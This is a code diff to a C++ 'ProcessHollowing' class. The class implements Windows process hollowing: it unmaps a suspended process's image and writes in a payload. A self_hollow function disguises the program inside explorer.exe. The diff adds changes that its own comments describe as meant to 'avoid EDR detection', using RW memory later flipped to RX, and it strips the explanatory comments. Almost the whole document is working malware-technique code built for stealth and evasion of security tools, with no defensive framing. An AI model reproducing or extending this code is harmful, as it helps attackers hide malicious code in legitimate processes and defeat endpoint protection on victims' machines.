@@ -12,9 +12,7 @@ namespace nuub::domain {
 
 class ProcessHollowing {
 public:
-    // Hollow a legitimate process and inject our code
     static bool hollow_and_run(const std::wstring& target_process, const std::vector<uint8_t>& payload) {
-        // 1. Create suspended process
         STARTUPINFOW si{};
         si.cb = sizeof(si);
         PROCESS_INFORMATION pi{};
@@ -28,7 +26,6 @@ public:
             return false;
         }
 
-        // 2. Get process context
         CONTEXT ctx{};
         ctx.ContextFlags = CONTEXT_FULL;
         if (!GetThreadContext(pi.hThread, &ctx)) {
@@ -38,7 +35,6 @@ public:
             return false;
         }
 
-        // 3. Read PEB to find image base
         #ifdef _WIN64
         PVOID image_base_ptr = reinterpret_cast<PVOID>(ctx.Rdx + 0x10);
         #else
@@ -53,8 +49,7 @@ public:
             return false;
         }
 
-        // 4. Unmap original image
-        typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(HANDLE, PVOID);
+        typedef LONG (NTAPI* NtUnmapViewOfSection_t)(HANDLE, PVOID);
         auto NtUnmapViewOfSection = reinterpret_cast<NtUnmapViewOfSection_t>(
             GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
 
@@ -65,7 +60,6 @@ public:
             return false;
         }
 
-        // 5. Parse PE headers from payload
         if (payload.size() < sizeof(IMAGE_DOS_HEADER)) {
             TerminateProcess(pi.hProcess, 0);
             CloseHandle(pi.hThread);
@@ -93,18 +87,17 @@ public:
         SIZE_T image_size = nt_headers->OptionalHeader.SizeOfImage;
         DWORD old_protect = 0;
 
-        // 6. Allocate memory for new image
+        // Allocate as RW (never RWX) — avoid EDR detection
         LPVOID new_base = VirtualAllocEx(
             pi.hProcess,
             reinterpret_cast<LPVOID>(nt_headers->OptionalHeader.ImageBase),
             image_size,
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE);
+            PAGE_READWRITE);
 
         if (!new_base) {
-            // If preferred base unavailable, allocate anywhere
             new_base = VirtualAllocEx(pi.hProcess, nullptr, image_size,
-                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             if (!new_base) {
                 TerminateProcess(pi.hProcess, 0);
                 CloseHandle(pi.hThread);
@@ -113,7 +106,7 @@ public:
             }
         }
 
-        // 7. Write headers
+        // Write headers
         if (!WriteProcessMemory(pi.hProcess, new_base, payload.data(),
                                 dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS), nullptr)) {
             TerminateProcess(pi.hProcess, 0);
@@ -122,7 +115,7 @@ public:
             return false;
         }
 
-        // 8. Write sections
+        // Write sections
         auto* section = IMAGE_FIRST_SECTION(nt_headers);
         for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
             if (section[i].SizeOfRawData > 0) {
@@ -140,7 +133,10 @@ public:
             }
         }
 
-        // 9. Update PEB image base
+        // Change protection to RX (never RWX) — key anti-detection step
+        VirtualProtectEx(pi.hProcess, new_base, image_size, PAGE_EXECUTE_READ, &old_protect);
+
+        // Update PEB image base
         #ifdef _WIN64
         ctx.Rdx = reinterpret_cast<DWORD64>(new_base);
         #else
@@ -154,7 +150,6 @@ public:
             return false;
         }
 
-        // 10. Resume the thread
         ResumeThread(pi.hThread);
 
         CloseHandle(pi.hThread);
@@ -162,9 +157,7 @@ public:
         return true;
     }
 
-    // Run ourselves hollowed in explorer.exe
     static bool self_hollow() {
-        // Read our own executable
         wchar_t exe_path[MAX_PATH]{};
         GetModuleFileNameW(nullptr, exe_path, MAX_PATH);
 
@@ -181,7 +174,6 @@ public:
 
         if (bytes_read != file_size) return false;
 
-        // Hollow explorer.exe
         return hollow_and_run(L"explorer.exe", exe_data);
     }
 };
